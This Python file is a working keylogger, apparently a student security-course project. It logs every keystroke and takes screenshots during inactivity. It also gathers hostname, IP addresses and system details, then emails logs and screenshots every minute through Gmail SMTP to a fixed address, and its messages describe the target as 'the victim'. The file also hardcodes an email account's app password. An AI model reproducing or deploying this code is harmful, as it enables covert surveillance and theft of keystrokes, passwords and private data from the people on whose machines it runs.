from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

from pynput.keyboard import Key, Listener

import os
import time

from requests import get

from PIL import ImageGrab 

keys_info = "key_log.txt"
sys_info = "sys_info.txt"
encrypted_key_log = "e_key_log.txt"
encrypted_sys_info = "e_sys_info.txt"

file_path = "/Users/prisharao/Downloads/git-files/6841/comp6841/keylogger/project/" 
extend = "/"

email_addy = "nightleaf123@gmail.com" 
password = "hmth kngc bour olqy" 
# replace it with your own password -> changed after submitting project for privacy reasons 
# something to note when I did set up this keylogger, it seems that google is becoming very 
# stict on the apps that are allowed to send info. I tried to send it to the 6841.demo@gmail.com 
# however the less trusted apps would not allow so without 2FA set up. I had another spare email 
# with 2 FA that I decided to use but yeah that is something that has changed this year and is 
# good to add more protections for users. 

toaddr =  "nightleaf123@gmail.com"
screenshot_info = "screenshot.png"

time_int = 60

last_activity_time = time.time()
sys_info_sent = False

def send_email(subject, message, filename, attachment):
    msg = MIMEMultipart()
    msg['From'] = email_addy
    msg['To'] = toaddr
    msg['Subject'] = subject
    msg.attach(MIMEText(message, 'plain'))

    with open(attachment, "rb") as attach_file:
        part = MIMEBase('application', 'octet-stream')
        part.set_payload(attach_file.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', f"attachment; filename={filename}")
        msg.attach(part)

    with smtplib.SMTP('smtp.gmail.com', 587) as server:
        server.starttls()
        server.login(email_addy, password)
        server.sendmail(email_addy, toaddr, msg.as_string())

# code tutorial for computer info function: https://www.youtube.com/watch?v=25um032xgrw&t=586s
def computer_information():
    with open(file_path + extend + sys_info, "w") as f:
        hostname = socket.gethostname()
        IPaddy = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip + '\n')

        except Exception:
            f.write("Error: could nto get IP address")

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPaddy + "\n")
    
    send_email("Sys Info Log", "This file contains the system info for the victim.", sys_info, file_path + sys_info)

# simple keylogger implementation
count = 0
keys = []

def capture_screenshot():
    global last_activity_time
    while True:
        if time.time() - last_activity_time >= 20:  # 20 seconds of inactivity
            screenshot_path = file_path + screenshot_info
            screenshot = ImageGrab.grab()
            screenshot.save(screenshot_path)
            print("Screenshot captured due to inactivity.")
        time.sleep(1)

def if_pressed(key):
    global keys, count

    global last_activity_time
    last_activity_time = time.time()

    print(key)
    keys.append(key)
    count += 1

    if count >= 1: 
        count = 0
        write_to_file(keys)
        keys = []


def write_to_file(keys):
    with open(file_path + extend + keys_info, "a") as f:
        for key in keys:
            rem_single_quotes = str(key).replace("'", "")
            if rem_single_quotes.find("space") > 0:
                f.write('\n')
                f.close
            elif rem_single_quotes.find("Key") == -1:
                f.write(rem_single_quotes)
                f.close()


def on_rel(key):
    if key == Key.esc:
        return False

def gather_and_send():
    global sys_info_sent
    
    if not sys_info_sent: 
        computer_information()
        sys_info_sent = True
    
    while True: 
        send_email("Key Info Log", "This file contains the Keylogging info for the victim.", keys_info, file_path + keys_info)
        if os.path.exists(file_path + screenshot_info):
            send_email("Inactivity Screenshot", "Captured screenshot after 20 seconds of inactivity.", screenshot_info, file_path + screenshot_info)

        open(file_path + keys_info, "w").close()  # Clear the keystroke log after sending
        time.sleep(time_int)
        if os.path.exists(file_path + screenshot_info):
            os.remove(file_path + screenshot_info)

if __name__ == "__main__":
    from threading import Thread
    
    screenshot_thread = Thread(target=capture_screenshot)
    screenshot_thread.start()

    email_thread = Thread(target=gather_and_send)
    email_thread.start()

    with Listener(on_press=if_pressed, on_release=on_rel) as listener:
        listener.join()

